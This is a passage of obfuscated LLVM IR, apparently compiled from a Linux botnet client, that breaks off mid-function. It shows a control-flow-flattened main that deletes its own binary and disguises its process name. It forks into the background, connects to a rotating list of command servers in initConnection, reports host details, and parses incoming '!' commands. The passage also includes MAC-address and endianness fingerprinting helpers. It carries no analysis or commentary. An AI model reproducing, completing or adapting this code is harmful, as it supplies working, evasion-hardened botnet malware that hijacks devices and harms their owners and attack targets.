  %60 = load i8, i8* %59, align 1
  %61 = zext i8 %60 to i32
  %62 = icmp ne i32 %61, 9
  %63 = select i1 %62, i32 1433163740, i32 177532212
  store i32 %63, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  %65 = load i8*, i8** %9, align 8
  %66 = getelementptr inbounds i8, i8* %65, i32 1
  store i8* %66, i8** %9, align 8
  store i32 1166619664, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  %68 = load i8*, i8** %9, align 8
  store i8 0, i8* %68, align 1
  store i32 -366941826, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %70, i8 0, i64 4096, i32 16, i1 false)
  store i32 -610967670, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %7, align 4
  %73 = call i32 @close(i32 %72)
  %74 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %75 = load i8, i8* %74, align 16
  %76 = icmp ne i8 %75, 0
  %77 = select i1 %76, i32 -620505471, i32 20421108
  store i32 %77, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 0
  %80 = bitcast %union.anon.4* %79 to [16 x i8]*
  %81 = getelementptr inbounds [16 x i8], [16 x i8]* %80, i32 0, i32 0
  %82 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %83 = call i8* @strcpy(i8* %81, i8* %82) #3
  %84 = load i32, i32* %2, align 4
  %85 = call i32 (i32, i64, ...) @ioctl(i32 %84, i64 35111, %struct.ifreq* %11) #3
  store i32 0, i32* %10, align 4
  store i32 1630630214, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = load i32, i32* %10, align 4
  %88 = icmp slt i32 %87, 6
  %89 = select i1 %88, i32 1857181460, i32 -1144987013
  store i32 %89, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  %91 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %92 = bitcast %union.anon.5* %91 to %struct.sockaddr*
  %93 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %92, i32 0, i32 1
  %94 = getelementptr inbounds [14 x i8], [14 x i8]* %93, i32 0, i32 0
  %95 = load i32, i32* %10, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds i8, i8* %94, i64 %96
  %98 = load i8, i8* %97, align 1
  %99 = load i32, i32* %10, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %100
  store i8 %98, i8* %101, align 1
  store i32 -1290756134, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  %103 = load i32, i32* %10, align 4
  %104 = add nsw i32 %103, 1
  store i32 %104, i32* %10, align 4
  store i32 1630630214, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  store i32 20421108, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  %107 = load i32, i32* %2, align 4
  %108 = call i32 @close(i32 %107)
  store i32 -536589002, i32* %switchVar
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  %110 = load i32, i32* %1, align 4
  ret i32 %110

loopEnd:                                          ; preds = %106, %105, %102, %90, %86, %78, %71, %69, %67, %64, %58, %56, %51, %45, %40, %39, %32, %31, %17, %16, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #1

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #1

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #1

; Function Attrs: noinline nounwind uwtable
define i32 @getEndianness() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca %struct.in_addr, align 4
  %3 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %4 = getelementptr inbounds [4 x i8], [4 x i8]* %3, i64 0, i64 0
  store i8 0, i8* %4, align 4
  %5 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %6 = getelementptr inbounds [4 x i8], [4 x i8]* %5, i64 0, i64 1
  store i8 1, i8* %6, align 1
  %7 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %8 = getelementptr inbounds [4 x i8], [4 x i8]* %7, i64 0, i64 2
  store i8 2, i8* %8, align 2
  %9 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %10 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 3
  store i8 3, i8* %10, align 1
  %11 = bitcast %struct.in_addr* %2 to i32*
  %12 = load i32, i32* %11, align 4
  store i32 %12, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -569531129, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar11 = load i32, i32* %switchVar
  switch i32 %switchVar11, label %switchDefault [
    i32 -569531129, label %NodeBlock9
    i32 -1013923592, label %NodeBlock7
    i32 -1815701324, label %LeafBlock5
    i32 -289169391, label %LeafBlock3
    i32 -1223501325, label %NodeBlock
    i32 1408662250, label %LeafBlock1
    i32 -1870984375, label %LeafBlock
    i32 -956832736, label %20
    i32 -1240699827, label %21
    i32 -1897994516, label %22
    i32 -1332729367, label %23
    i32 159349423, label %NewDefault
    i32 -46753750, label %24
    i32 293250522, label %25
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

NodeBlock9:                                       ; preds = %loopEntry
  %.reload17 = load volatile i32, i32* %.reg2mem
  %Pivot10 = icmp slt i32 %.reload17, 33751041
  %13 = select i1 %Pivot10, i32 -1223501325, i32 -1013923592
  store i32 %13, i32* %switchVar
  br label %loopEnd

NodeBlock7:                                       ; preds = %loopEntry
  %.reload13 = load volatile i32, i32* %.reg2mem
  %Pivot8 = icmp slt i32 %.reload13, 50462976
  %14 = select i1 %Pivot8, i32 -289169391, i32 -1815701324
  store i32 %14, i32* %switchVar
  br label %loopEnd

LeafBlock5:                                       ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %SwitchLeaf6 = icmp eq i32 %.reload, 50462976
  %15 = select i1 %SwitchLeaf6, i32 -1240699827, i32 159349423
  store i32 %15, i32* %switchVar
  br label %loopEnd

LeafBlock3:                                       ; preds = %loopEntry
  %.reload12 = load volatile i32, i32* %.reg2mem
  %SwitchLeaf4 = icmp eq i32 %.reload12, 33751041
  %16 = select i1 %SwitchLeaf4, i32 -1897994516, i32 159349423
  store i32 %16, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload16 = load volatile i32, i32* %.reg2mem
  %Pivot = icmp slt i32 %.reload16, 16777986
  %17 = select i1 %Pivot, i32 -1870984375, i32 1408662250
  store i32 %17, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload14 = load volatile i32, i32* %.reg2mem
  %SwitchLeaf2 = icmp eq i32 %.reload14, 16777986
  %18 = select i1 %SwitchLeaf2, i32 -1332729367, i32 159349423
  store i32 %18, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload15 = load volatile i32, i32* %.reg2mem
  %SwitchLeaf = icmp eq i32 %.reload15, 66051
  %19 = select i1 %SwitchLeaf, i32 -956832736, i32 159349423
  store i32 %19, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  store i32 ptrtoint ([11 x i8]* @.str.136 to i32), i32* %1, align 4
  store i32 293250522, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  store i32 ptrtoint ([14 x i8]* @.str.137 to i32), i32* %1, align 4
  store i32 293250522, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  store i32 ptrtoint ([13 x i8]* @.str.138 to i32), i32* %1, align 4
  store i32 293250522, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  store i32 ptrtoint ([16 x i8]* @.str.139 to i32), i32* %1, align 4
  store i32 293250522, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 -46753750, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  store i32 ptrtoint ([8 x i8]* @.str.140 to i32), i32* %1, align 4
  store i32 293250522, i32* %switchVar
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = load i32, i32* %1, align 4
  ret i32 %26

loopEnd:                                          ; preds = %24, %NewDefault, %23, %22, %21, %20, %LeafBlock, %LeafBlock1, %NodeBlock, %LeafBlock3, %LeafBlock5, %NodeBlock7, %NodeBlock9, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca [4096 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 4096, i32 16, i1 false)
  %5 = load i32, i32* @switchCommStock, align 4
  store i32 %5, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1970080843, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1970080843, label %first
    i32 -1439381856, label %8
    i32 -730555286, label %11
    i32 -2142356077, label %17
    i32 -2085044657, label %18
    i32 -1197473917, label %21
    i32 -1019804637, label %35
    i32 1480631690, label %42
    i32 165007635, label %50
    i32 -1329533622, label %51
    i32 1391153280, label %52
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %6 = icmp ne i32 %.reload, 0
  %7 = select i1 %6, i32 -1439381856, i32 -730555286
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i32, i32* @switchCommStock, align 4
  %10 = call i32 @close(i32 %9)
  store i32 0, i32* @switchCommStock, align 4
  store i32 -730555286, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* @botnetServer, align 4
  %13 = add nsw i32 %12, 1
  %14 = sext i32 %13 to i64
  %15 = icmp eq i64 %14, 50
  %16 = select i1 %15, i32 -2142356077, i32 -2085044657
  store i32 %16, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i32 0, i32* @botnetServer, align 4
  store i32 -1197473917, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i32, i32* @botnetServer, align 4
  %20 = add nsw i32 %19, 1
  store i32 %20, i32* @botnetServer, align 4
  store i32 -1197473917, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  %22 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %23 = load i32, i32* @botnetServer, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds [100 x i32], [100 x i32]* @ServerInfo, i64 0, i64 %24
  %26 = load i32, i32* %25, align 4
  %27 = sext i32 %26 to i64
  %28 = inttoptr i64 %27 to i8*
  %29 = call i8* @strcpy(i8* %22, i8* %28) #3
  %30 = load i32, i32* @botnetServer, align 4
  store i32 %30, i32* %3, align 4
  %31 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %32 = call i8* @strchr(i8* %31, i32 58) #9
  %33 = icmp ne i8* %32, null
  %34 = select i1 %33, i32 -1019804637, i32 1480631690
  store i32 %34, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %37 = call i8* @strchr(i8* %36, i32 58) #9
  %38 = getelementptr inbounds i8, i8* %37, i64 1
  %39 = call i32 @atoi(i8* %38) #9
  store i32 %39, i32* %3, align 4
  %40 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %41 = call i8* @strchr(i8* %40, i32 58) #9
  store i8 0, i8* %41, align 1
  store i32 1480631690, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = call i32 @socket(i32 2, i32 1, i32 0) #3
  store i32 %43, i32* @switchCommStock, align 4
  %44 = load i32, i32* @switchCommStock, align 4
  %45 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %46 = load i32, i32* %3, align 4
  %47 = call i32 @connectTimeout(i32 %44, i8* %45, i32 %46, i32 30)
  %48 = icmp ne i32 %47, 0
  %49 = select i1 %48, i32 -1329533622, i32 165007635
  store i32 %49, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  store i32 1, i32* %1, align 4
  store i32 1391153280, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 1391153280, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %1, align 4
  ret i32 %53

loopEnd:                                          ; preds = %51, %50, %42, %35, %21, %18, %17, %11, %8, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #5

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [32 x i8], align 16
  %7 = alloca [32 x i8], align 16
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca [4096 x i8], align 16
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i8*, align 8
  %18 = alloca i8*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca [10 x i8*], align 16
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %25 = load i8**, i8*** %5, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 0
  %27 = load i8*, i8** %26, align 8
  %28 = call i32 @unlink(i8* %27) #3
  call void @rand_init()
  %29 = call i32 @rand_next()
  %30 = urem i32 %29, 4
  %31 = add i32 %30, 3
  %32 = mul i32 %31, 4
  store i32 %32, i32* %8, align 4
  %33 = getelementptr inbounds [32 x i8], [32 x i8]* %6, i32 0, i32 0
  %34 = load i32, i32* %8, align 4
  call void @rand_alphastr(i8* %33, i32 %34)
  %35 = load i32, i32* %8, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds [32 x i8], [32 x i8]* %6, i64 0, i64 %36
  store i8 0, i8* %37, align 1
  %38 = load i8**, i8*** %5, align 8
  %39 = getelementptr inbounds i8*, i8** %38, i64 0
  %40 = load i8*, i8** %39, align 8
  %41 = getelementptr inbounds [32 x i8], [32 x i8]* %6, i32 0, i32 0
  %42 = call i32 @util_strcpy(i8* %40, i8* %41)
  %43 = call i32 @rand_next()
  %44 = urem i32 %43, 6
  %45 = add i32 %44, 3
  %46 = mul i32 %45, 4
  store i32 %46, i32* %8, align 4
  %47 = getelementptr inbounds [32 x i8], [32 x i8]* %6, i32 0, i32 0
  %48 = load i32, i32* %8, align 4
  call void @rand_alphastr(i8* %47, i32 %48)
  %49 = load i32, i32* %8, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds [32 x i8], [32 x i8]* %6, i64 0, i64 %50
  store i8 0, i8* %51, align 1
  %52 = getelementptr inbounds [32 x i8], [32 x i8]* %6, i32 0, i32 0
  %53 = call i32 (i32, ...) @prctl(i32 15, i8* %52) #3
  %54 = call i64 @time(i64* null) #3
  %55 = call i32 @getpid() #3
  %56 = sext i32 %55 to i64
  %57 = xor i64 %54, %56
  %58 = trunc i64 %57 to i32
  call void @srand(i32 %58) #3
  call void @rand_init()
  %59 = call i32 @getOurIP()
  %60 = call i32 @fork() #3
  store i32 %60, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %9, align 4
  %switchVar = alloca i32
  store i32 -1975882614, i32* %switchVar
  %.reg2mem3 = alloca i1
  %.reg2mem5 = alloca i1
  %.reg2mem7 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1975882614, label %first
    i32 99827965, label %63
    i32 608442933, label %66
    i32 -1108762519, label %70
    i32 2133368280, label %74
    i32 -1295205100, label %75
    i32 1732354832, label %79
    i32 268822605, label %80
    i32 -1774072810, label %81
    i32 371378082, label %82
    i32 253494384, label %83
    i32 -1663783182, label %84
    i32 265747936, label %85
    i32 -690614907, label %88
    i32 62898661, label %92
    i32 1217243552, label %93
    i32 -1097849363, label %101
    i32 612392877, label %107
    i32 -1637990189, label %108
    i32 -592363091, label %114
    i32 1797821211, label %123
    i32 -1324967220, label %126
    i32 -762318480, label %132
    i32 678479830, label %143
    i32 -1356003968, label %146
    i32 -282773131, label %159
    i32 -1251469919, label %165
    i32 1113562089, label %175
    i32 -276779987, label %178
    i32 1701459438, label %182
    i32 -1162967784, label %183
    i32 1204792186, label %186
    i32 1373251317, label %197
    i32 1618770504, label %200
    i32 -1312755910, label %206
    i32 1335478645, label %211
    i32 837314517, label %213
    i32 -1851979322, label %216
    i32 1316414735, label %222
    i32 1401731104, label %223
    i32 1107224454, label %232
    i32 -2037004023, label %242
    i32 387629105, label %251
    i32 -2074422500, label %253
    i32 -1229216638, label %259
    i32 -983682801, label %261
    i32 1091283592, label %267
    i32 -1166747745, label %272
    i32 1610551668, label %274
    i32 1493157906, label %277
    i32 -393595543, label %282
    i32 -1358087798, label %287
    i32 1686201008, label %296
    i32 156173017, label %301
    i32 -285300511, label %305
    i32 1920616238, label %311
    i32 -1480611418, label %334
    i32 -1763603420, label %336
    i32 -1102054052, label %342
    i32 1371527457, label %343
    i32 -83508572, label %348
    i32 -1009571068, label %353
    i32 -912321965, label %356
    i32 1510142045, label %357
    i32 749581640, label %358
    i32 872389490, label %359
    i32 557978318, label %360
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %61 = icmp ne i32 %.reload, 0
  %62 = select i1 %61, i32 99827965, i32 608442933
  store i32 %62, i32* %switchVar
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  %64 = load i32, i32* %9, align 4
  %65 = call i32 @waitpid(i32 %64, i32* %11, i32 0)
  call void @exit(i32 0) #11
  unreachable

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i32, i32* %9, align 4
  %68 = icmp ne i32 %67, 0
  %69 = select i1 %68, i32 253494384, i32 -1108762519
  store i32 %69, i32* %switchVar
  br label %loopEnd

; <label>:70:                                     ; preds = %loopEntry
  %71 = call i32 @fork() #3
  store i32 %71, i32* %10, align 4
  %72 = icmp ne i32 %71, 0
  %73 = select i1 %72, i32 2133368280, i32 -1295205100
  store i32 %73, i32* %switchVar
  br label %loopEnd

; <label>:74:                                     ; preds = %loopEntry
  call void @exit(i32 0) #11
  unreachable

; <label>:75:                                     ; preds = %loopEntry
  %76 = load i32, i32* %10, align 4
  %77 = icmp ne i32 %76, 0
  %78 = select i1 %77, i32 268822605, i32 1732354832
  store i32 %78, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  store i32 -1774072810, i32* %switchVar
  br label %loopEnd

; <label>:80:                                     ; preds = %loopEntry
  store i32 -1774072810, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  store i32 371378082, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  store i32 -1663783182, i32* %switchVar
  br label %loopEnd

; <label>:83:                                     ; preds = %loopEntry
  store i32 -1663783182, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  store i32 265747936, i32* %switchVar
  br label %loopEnd

; <label>:85:                                     ; preds = %loopEntry
  %86 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.141, i32 0, i32 0)) #3
  %87 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #3
  store i32 -690614907, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  %89 = call i32 @initConnection()
  %90 = icmp ne i32 %89, 0
  %91 = select i1 %90, i32 62898661, i32 1217243552
  store i32 %91, i32* %switchVar
  br label %loopEnd

; <label>:92:                                     ; preds = %loopEntry
  store i32 -690614907, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load i32, i32* @switchCommStock, align 4
  %95 = call i8* @getBuild()
  %96 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %97 = call i8* @inet_ntoa(i32 %96) #3
  %98 = call i32 @getEndianness()
  %99 = call i8* @getBuildz()
  %100 = call i32 (i32, i8*, ...) @botnetPrint(i32 %94, i8* getelementptr inbounds ([130 x i8], [130 x i8]* @.str.142, i32 0, i32 0), i8* %95, i8* %97, i32 %98, i8* %99)
  call void @CleanDevice()
  call void @UpdateNameSrvs()
  store i32 0, i32* %13, align 4
  store i32 0, i32* %14, align 4
  store i32 -1097849363, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  %102 = load i32, i32* @switchCommStock, align 4
  %103 = getelementptr inbounds [4096 x i8], [4096 x i8]* %12, i32 0, i32 0
  %104 = call i32 @recvLine(i32 %102, i8* %103, i32 4096)
  store i32 %104, i32* %13, align 4
  %105 = icmp ne i32 %104, -1
  %106 = select i1 %105, i32 612392877, i32 872389490
  store i32 %106, i32* %switchVar
  br label %loopEnd

; <label>:107:                                    ; preds = %loopEntry
  store i32 0, i32* %14, align 4
  store i32 -1637990189, i32* %switchVar
  br label %loopEnd

; <label>:108:                                    ; preds = %loopEntry
  %109 = load i32, i32* %14, align 4
  %110 = sext i32 %109 to i64
  %111 = load i64, i64* @numpids, align 8
  %112 = icmp ult i64 %110, %111
  %113 = select i1 %112, i32 -592363091, i32 1204792186
  store i32 %113, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = load i32*, i32** @pids, align 8
  %116 = load i32, i32* %14, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds i32, i32* %115, i64 %117
  %119 = load i32, i32* %118, align 4
  %120 = call i32 @waitpid(i32 %119, i32* null, i32 1)
  %121 = icmp sgt i32 %120, 0
  %122 = select i1 %121, i32 1797821211, i32 1701459438
  store i32 %122, i32* %switchVar
  br label %loopEnd

; <label>:123:                                    ; preds = %loopEntry
  %124 = load i32, i32* %14, align 4
  %125 = add nsw i32 %124, 1
  store i32 %125, i32* %16, align 4
  store i32 -1324967220, i32* %switchVar
  br label %loopEnd

; <label>:126:                                    ; preds = %loopEntry
  %127 = load i32, i32* %16, align 4
  %128 = zext i32 %127 to i64
  %129 = load i64, i64* @numpids, align 8
  %130 = icmp ult i64 %128, %129
  %131 = select i1 %130, i32 -762318480, i32 -1356003968
  store i32 %131, i32* %switchVar
  br label %loopEnd

; <label>:132:                                    ; preds = %loopEntry
  %133 = load i32*, i32** @pids, align 8
  %134 = load i32, i32* %16, align 4
  %135 = zext i32 %134 to i64
  %136 = getelementptr inbounds i32, i32* %133, i64 %135
  %137 = load i32, i32* %136, align 4
  %138 = load i32*, i32** @pids, align 8
  %139 = load i32, i32* %16, align 4
  %140 = sub i32 %139, 1
  %141 = zext i32 %140 to i64
  %142 = getelementptr inbounds i32, i32* %138, i64 %141
  store i32 %137, i32* %142, align 4
  store i32 678479830, i32* %switchVar
  br label %loopEnd

; <label>:143:                                    ; preds = %loopEntry
  %144 = load i32, i32* %16, align 4
  %145 = add i32 %144, 1
  store i32 %145, i32* %16, align 4
  store i32 -1324967220, i32* %switchVar
  br label %loopEnd

; <label>:146:                                    ; preds = %loopEntry
  %147 = load i32*, i32** @pids, align 8
  %148 = load i32, i32* %16, align 4
  %149 = sub i32 %148, 1
  %150 = zext i32 %149 to i64
  %151 = getelementptr inbounds i32, i32* %147, i64 %150
  store i32 0, i32* %151, align 4
  %152 = load i64, i64* @numpids, align 8
  %153 = add i64 %152, -1
  store i64 %153, i64* @numpids, align 8
  %154 = load i64, i64* @numpids, align 8
  %155 = add i64 %154, 1
  %156 = mul i64 %155, 4
  %157 = call noalias i8* @malloc(i64 %156) #3
  %158 = bitcast i8* %157 to i32*
  store i32* %158, i32** %15, align 8
  store i32 0, i32* %16, align 4
  store i32 -282773131, i32* %switchVar
  br label %loopEnd

; <label>:159:                                    ; preds = %loopEntry
  %160 = load i32, i32* %16, align 4
  %161 = zext i32 %160 to i64
  %162 = load i64, i64* @numpids, align 8
  %163 = icmp ult i64 %161, %162
  %164 = select i1 %163, i32 -1251469919, i32 -276779987
  store i32 %164, i32* %switchVar
  br label %loopEnd

; <label>:165:                                    ; preds = %loopEntry
  %166 = load i32*, i32** @pids, align 8
  %167 = load i32, i32* %16, align 4
  %168 = zext i32 %167 to i64
  %169 = getelementptr inbounds i32, i32* %166, i64 %168
  %170 = load i32, i32* %169, align 4
  %171 = load i32*, i32** %15, align 8
  %172 = load i32, i32* %16, align 4
  %173 = zext i32 %172 to i64
  %174 = getelementptr inbounds i32, i32* %171, i64 %173
  store i32 %170, i32* %174, align 4
  store i32 1113562089, i32* %switchVar
  br label %loopEnd

; <label>:175:                                    ; preds = %loopEntry
  %176 = load i32, i32* %16, align 4
  %177 = add i32 %176, 1
  store i32 %177, i32* %16, align 4
  store i32 -282773131, i32* %switchVar
  br label %loopEnd

; <label>:178:                                    ; preds = %loopEntry
  %179 = load i32*, i32** @pids, align 8
  %180 = bitcast i32* %179 to i8*
  call void @free(i8* %180) #3
  %181 = load i32*, i32** %15, align 8
  store i32* %181, i32** @pids, align 8
  store i32 1701459438, i32* %switchVar
  br label %loopEnd

; <label>:182:                                    ; preds = %loopEntry
  store i32 -1162967784, i32* %switchVar
  br label %loopEnd

; <label>:183:                                    ; preds = %loopEntry
  %184 = load i32, i32* %14, align 4
  %185 = add nsw i32 %184, 1
  store i32 %185, i32* %14, align 4
  store i32 -1637990189, i32* %switchVar
  br label %loopEnd

; <label>:186:                                    ; preds = %loopEntry
  %187 = load i32, i32* %13, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds [4096 x i8], [4096 x i8]* %12, i64 0, i64 %188
  store i8 0, i8* %189, align 1
  %190 = getelementptr inbounds [4096 x i8], [4096 x i8]* %12, i32 0, i32 0
  call void @trim(i8* %190)
  %191 = getelementptr inbounds [4096 x i8], [4096 x i8]* %12, i32 0, i32 0
  store i8* %191, i8** %17, align 8
  %192 = load i8*, i8** %17, align 8
  %193 = load i8, i8* %192, align 1
  %194 = zext i8 %193 to i32
  %195 = icmp eq i32 %194, 33
  %196 = select i1 %195, i32 1373251317, i32 749581640
  store i32 %196, i32* %switchVar
  br label %loopEnd

; <label>:197:                                    ; preds = %loopEntry
  %198 = load i8*, i8** %17, align 8
  %199 = getelementptr inbounds i8, i8* %198, i64 1
  store i8* %199, i8** %18, align 8
  store i32 1618770504, i32* %switchVar
  br label %loopEnd

; <label>:200:                                    ; preds = %loopEntry
  %201 = load i8*, i8** %18, align 8
  %202 = load i8, i8* %201, align 1
  %203 = zext i8 %202 to i32
  %204 = icmp ne i32 %203, 32
  %205 = select i1 %204, i32 -1312755910, i32 1335478645
  store i32 %205, i32* %switchVar
  store i1 false, i1* %.reg2mem3
  br label %loopEnd

; <label>:206:                                    ; preds = %loopEntry
  %207 = load i8*, i8** %18, align 8
  %208 = load i8, i8* %207, align 1
  %209 = zext i8 %208 to i32
  %210 = icmp ne i32 %209, 0
  store i32 1335478645, i32* %switchVar
  store i1 %210, i1* %.reg2mem3
  br label %loopEnd

; <label>:211:                                    ; preds = %loopEntry
  %.reload4 = load i1, i1* %.reg2mem3
  %212 = select i1 %.reload4, i32 837314517, i32 -1851979322
  store i32 %212, i32* %switchVar
  br label %loopEnd

; <label>:213:                                    ; preds = %loopEntry
  %214 = load i8*, i8** %18, align 8
  %215 = getelementptr inbounds i8, i8* %214, i32 1
  store i8* %215, i8** %18, align 8
  store i32 1618770504, i32* %switchVar
  br label %loopEnd

; <label>:216:                                    ; preds = %loopEntry
  %217 = load i8*, i8** %18, align 8
  %218 = load i8, i8* %217, align 1
  %219 = zext i8 %218 to i32
  %220 = icmp eq i32 %219, 0
  %221 = select i1 %220, i32 1316414735, i32 1401731104
  store i32 %221, i32* %switchVar
  br label %loopEnd

; <label>:222:                                    ; preds = %loopEntry
  store i32 -1097849363, i32* %switchVar
  br label %loopEnd

; <label>:223:                                    ; preds = %loopEntry
  %224 = load i8*, i8** %18, align 8
  store i8 0, i8* %224, align 1
  %225 = load i8*, i8** %17, align 8
  %226 = getelementptr inbounds i8, i8* %225, i64 1
  store i8* %226, i8** %18, align 8
  %227 = load i8*, i8** %17, align 8
